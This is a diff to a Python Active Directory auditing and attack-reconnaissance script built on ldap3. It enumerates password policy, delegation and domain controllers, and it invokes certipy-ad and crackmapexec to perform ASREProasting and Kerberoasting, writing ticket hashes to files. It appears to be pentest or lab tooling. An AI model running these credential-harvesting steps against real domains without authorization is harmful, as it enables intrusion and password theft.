@@ -123,6 +123,7 @@ print(f"Default Context: {default_search_base}")
 print(f"Username: {args.username}")
 print(f"Password: {args.password}")
 print(f"Output Folder: {save_dir}")
+print(f"Scope: Ask")
 print("")
 
 ### Password Policies
@@ -133,17 +134,18 @@ print("")
 
 #### borrowed from: https://github.com/yaap7/ldapsearch-ad
 ### default password policies LDAP 									(objectClass=domainDNS)
-c.search(search_base=default_search_base, search_filter='(objectClass=domainDNS)', search_scope=ldap3.SUBTREE, attributes="*")
+c.extend.standard.paged_search(search_base=default_search_base, search_filter='(objectClass=domainDNS)', search_scope=ldap3.SUBTREE, attributes=['minPwdLength','pwdHistoryLength','pwdProperties','lockoutThreshold','lockoutDuration'], generator=False)
 
 with open(f"{save_dir}/full/pass_pols.txt", "w") as f:
 	f.write(str(c.response))
 
-
-minPwd = c.response[0]['attributes']['minPwdLength']
-hisLen = c.response[0]['attributes']['pwdHistoryLength']
-compBit = c.response[0]['attributes']['pwdProperties'] & 1 > 0
-lthres = c.response[0]['attributes']['lockoutThreshold']
-ldur = c.response[0]['attributes']['lockoutDuration']
+for resp in c.response:
+	if resp['type'] == 'searchResEntry':
+		minPwd = resp['attributes']['minPwdLength']
+		hisLen = resp['attributes']['pwdHistoryLength']
+		compBit = resp['attributes']['pwdProperties'] & 1 > 0
+		lthres = resp['attributes']['lockoutThreshold']
+		ldur = resp['attributes']['lockoutDuration']
 
 if(minPwd < 15):
 	print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Password Minimum Length: {bcolors.FAIL}{minPwd}{bcolors.ENDC}")
@@ -173,12 +175,12 @@ print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Lockout Duration: {ldur}")
 
 
 ##### LAPS in use? Every user should be able to see the AdmPwdExpiration attribute			Check for 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=DOMAIN' DOMAIN schema should be in s.info
-laps_use = c.search(search_base=s.info.other.get('SchemaNamingContext')[0], search_filter='(cn=ms-mcs-AdmPwdExpirationTime)', search_scope=ldap3.SUBTREE, attributes="*")
+laps_use = c.extend.standard.paged_search(search_base=s.info.other.get('SchemaNamingContext')[0], search_filter='(cn=ms-mcs-AdmPwdExpirationTime)', search_scope=ldap3.SUBTREE, attributes="name", generator=False)
 
-if(laps_use):
-	print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} LAPS installed: {bcolors.OKGREEN}{laps_use}{bcolors.ENDC}")
+if(len(laps_use) > 0):
+	print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} LAPS installed: {bcolors.OKGREEN}True{bcolors.ENDC}")
 else:
-	print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} LAPS installed: {bcolors.FAIL}{laps_use}{bcolors.ENDC}")
+	print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} LAPS installed: {bcolors.FAIL}False{bcolors.ENDC}")
 print("")
 print("Full password information dump saved to pass_pols.txt")
 print("")
@@ -194,7 +196,7 @@ forestroot = s.info.other['rootDomainNamingContext'][0]
 
 zones = set()
 
-c.search(search_base=f"CN=MicrosoftDNS,DC=DomainDnsZones,{domainroot}" , search_filter='(objectClass=dnsZone)', search_scope=LEVEL, attributes=['dc'])
+c.extend.standard.paged_search(search_base=f"CN=MicrosoftDNS,DC=DomainDnsZones,{domainroot}" , search_filter='(objectClass=dnsZone)', search_scope=LEVEL, attributes=['dc'], generator=False)
 
 for entry in c.response:
     if entry['type'] != 'searchResEntry':
@@ -203,7 +205,7 @@ for entry in c.response:
     zones.add(f"DC={entry['attributes']['dc']},CN=MicrosoftDNS,DC=DomainDnsZones,{domainroot}")
 
 
-c.search(search_base=f"CN=MicrosoftDNS,DC=ForestDnsZones,{forestroot}" , search_filter='(objectClass=dnsZone)', search_scope=LEVEL, attributes=['dc'])
+c.extend.standard.paged_search(search_base=f"CN=MicrosoftDNS,DC=ForestDnsZones,{forestroot}" , search_filter='(objectClass=dnsZone)', search_scope=LEVEL, attributes=['dc'], generator=False)
 
 for entry in c.response:
     if entry['type'] != 'searchResEntry':
@@ -211,7 +213,7 @@ for entry in c.response:
 
     zones.add(f"DC={entry['attributes']['dc']},CN=MicrosoftDNS,DC=ForestDnsZones,{forestroot}")
 
-c.search(search_base=f"CN=MicrosoftDNS,CN=System,{domainroot}" , search_filter='(objectClass=dnsZone)', search_scope=LEVEL, attributes=['dc'])
+c.extend.standard.paged_search(search_base=f"CN=MicrosoftDNS,CN=System,{domainroot}" , search_filter='(objectClass=dnsZone)', search_scope=LEVEL, attributes=['dc'], generator=False)
 
 for entry in c.response:
     if entry['type'] != 'searchResEntry':
@@ -342,18 +344,18 @@ print(f"{bcolors.BOLD}Domain Controller Scanning{bcolors.ENDC}")
 print("=========================")
 print("")
 # get all NTDSDSA objects, only domain controllers run this service
-c.search(search_base=s.info.other.get('ConfigurationNamingContext')[0], search_filter='(objectClass=nTDSDSA)', search_scope=ldap3.SUBTREE, attributes="*")
+c.extend.standard.paged_search(search_base=s.info.other.get('ConfigurationNamingContext')[0], search_filter='(objectClass=nTDSDSA)', search_scope=ldap3.SUBTREE, attributes=["distinguishedName"], generator=False)
 
 dc_ip = []
 
 results = c.response 
 for i in range(len(results)):
 	if(results[i]["type"] == "searchResEntry"):
-		dName = results[0]["attributes"]["distinguishedName"]
+		dName = results[i]["attributes"]["distinguishedName"]
 
 		objectBase = dName[dName.index(",")+1:] # get the Parent CN=Child,CN=Parent,....DC=EXAMPLE,DC=NET
 
-		c.search(search_base=objectBase, search_filter='(objectClass=*)', search_scope=ldap3.BASE, attributes="*")
+		c.extend.standard.paged_search(search_base=objectBase, search_filter='(objectClass=*)', search_scope=ldap3.BASE, attributes=["name"], generator=False)
 
 		#should only return one response if we did it right
 		domain_controller_name = c.response[0]['attributes']['name']
@@ -433,7 +435,7 @@ system_ips = set()
 seen_ips = set()
 
 # LinWinPwn uses the adinaddump service to find ips, we will use 2 methods
-c.search(search_base=default_search_base, search_filter='(dnshostname=*)', search_scope=ldap3.SUBTREE, attributes="*")
+c.extend.standard.paged_search(search_base=default_search_base, search_filter='(dnshostname=*)', search_scope=ldap3.SUBTREE, attributes=["dnshostname"], generator=False)
 
 for a in A_records:
 	if(a['value'] in seen_ips):
@@ -493,6 +495,7 @@ print("")
 
 print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Scanning with certipy-ad")
 #TODO Different auth types
+#TODO often certipy finds the wrong ip for connecting too
 os.system(f"certipy-ad find -u '{args.username}@{args.domain}' -p '{args.password}' -dc-ip '{args.domain_controller_ip}' -vulnerable -output {save_dir}/")
 
 
@@ -503,7 +506,7 @@ print("=========================")
 print("")
 
 ##### Users with descriptions -> output to file (print number found)					(&(objectClass=user)(description=*))
-c.search(search_base=default_search_base, search_filter='(&(objectClass=user)(description=*))', search_scope=ldap3.SUBTREE, attributes="*")
+c.extend.standard.paged_search(search_base=default_search_base, search_filter='(&(objectClass=user)(description=*))', search_scope=ldap3.SUBTREE, attributes=["name", "description"], generator=False)
 
 count = 0
 with open(f"{save_dir}/full/users_dcsrp_full.txt", "w") as f:
@@ -520,7 +523,7 @@ print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Found {count} users with descriptions
 
 ##### Users without a password set -> output to file (print number found)				(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))
 
-c.search(search_base=default_search_base, search_filter='(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))', search_scope=ldap3.SUBTREE, attributes="*")
+c.extend.standard.paged_search(search_base=default_search_base, search_filter='(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))', search_scope=ldap3.SUBTREE, attributes=["name"], generator=False)
 
 count = 0
 with open(f"{save_dir}/users_no_req_pass.txt", "w") as f:
@@ -540,6 +543,7 @@ print("")
 ####### Retrieve tickets -> output to file
 # Make sure that there is a route to the nameserver (ie, cme needed dc01.inlanefreight.htb in /etc/hosts to work)
 # TODO change for dependance on auth method
+# TODO this breaks randomly when it cannot automatically determine ip of dc (usually grabs the wrong one, same issue with certipy)
 print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Performing {bcolors.PURPLE}CME{bcolors.ENDC} ASREProasting (output hidden)")  
 os.system(f"crackmapexec ldap {args.domain_controller_ip} -u {args.username} -p {args.password} --asreproast {save_dir}/users_asreproast.txt > /dev/null")
 print("")
@@ -549,7 +553,7 @@ print("")
 ##### Users where Kerberoasting is possible
 ####### Retrieve tickets -> output to file
 
-# 
+# TODO same issue as above
 # TODO change for dependance on auth method
 print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Performing {bcolors.PURPLE}CME{bcolors.ENDC} kerberoasting (output hidden)")  
 os.system(f"crackmapexec ldap {args.domain_controller_ip} -u {args.username} -p {args.password} --kerberoasting {save_dir}/users_kerberoasting.txt > /dev/null")
@@ -566,7 +570,7 @@ print("")
 
 
 ##### All objects with trusted for delegation -> output to file     					(userAccountControl:1.2.840.113556.1.4.803:=524288)
-c.search(search_base=default_search_base, search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', search_scope=ldap3.SUBTREE, attributes="*")
+c.extend.standard.paged_search(search_base=default_search_base, search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', search_scope=ldap3.SUBTREE, attributes=["samaccountname"], generator=False)
 
 with open(f"{save_dir}/full/objects_unconstrained_delegation_full.txt", "w") as f:
 	f.write(str(c.response))
@@ -582,7 +586,7 @@ print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Found: {count} AD Objects with Uncons
 
 
 ##### All objects with trusted for auth delegation -> output to file     					(userAccountControl:1.2.840.113556.1.4.803:=16777216)
-c.search(search_base=default_search_base, search_filter='(msDS-AllowedToDelegateTo=*)', search_scope=ldap3.SUBTREE, attributes="*")
+c.extend.standard.paged_search(search_base=default_search_base, search_filter='(msDS-AllowedToDelegateTo=*)', search_scope=ldap3.SUBTREE, attributes=["useraccountcontrol","samaccountname","msDS-AllowedToDelegateTo"], generator=False)
 
 with open(f"{save_dir}/full/objects_constrained_delegation_full.txt", "w") as f:
 	f.write(str(c.response))
@@ -609,7 +613,7 @@ print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Found: {countC} AD Objects with Const
 print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Found: {countCPT} AD Objects with Constrained Delegations with Protocol Transition")
 
 
-c.search(search_base=default_search_base, search_filter='(msDS-AllowedToActOnBehalfOfOtherIdentity=*)', search_scope=ldap3.SUBTREE, attributes="*")
+c.extend.standard.paged_search(search_base=default_search_base, search_filter='(msDS-AllowedToActOnBehalfOfOtherIdentity=*)', search_scope=ldap3.SUBTREE, attributes=["samaccountname","msDS-AllowedToActOnBehalfOfOtherIdentity"], generator=False)
 
 with open(f"{save_dir}/full/objects_rbcd_delegation_full.txt", "w") as f:
 	f.write(str(c.response))
@@ -626,18 +630,23 @@ with open(f"{save_dir}/delegation_rbcd_objects.txt", "w") as f:
 				sF = sF + "(objectSid="+ace['Ace']['Sid'].formatCanonical()+")"
 			sF = sF + ')'
 
-			c.search(search_base=default_search_base, search_filter=sF, search_scope=ldap3.BASE, attributes="*")
+			c.extend.standard.paged_search(search_base=default_search_base, search_filter=sF, search_scope=ldap3.BASE, attributes="*")
 
 			for dele in c.response:
 				f.write(f"{name} ::: delegates ::: {dele['attributes']['sAMAccountName']}\n")
 				count += 1
 
 
-c.search(search_base=default_search_base, search_filter='(ms-DS-MachineAccountQuota=*)', search_scope=ldap3.SUBTREE, attributes="ms-DS-MachineAccountQuota")
+c.extend.standard.paged_search(search_base=default_search_base, search_filter='(ms-DS-MachineAccountQuota=*)', search_scope=ldap3.SUBTREE, attributes=["ms-DS-MachineAccountQuota"], generator=False)
 
 
 print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Found: {count} AD Objects with Resource Based Constrained Delegations")
-macctq = c.response[0]['attributes']['ms-DS-MachineAccountQuota']
+
+for resp in c.response:
+	if(resp['type'] == "searchResEntry"):
+		macctq = resp['attributes']['ms-DS-MachineAccountQuota']
+		break
+
 if(macctq <= 0):
 	print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Machine Account Quota: {bcolors.OKGREEN}{macctq}{bcolors.ENDC}")
 else:
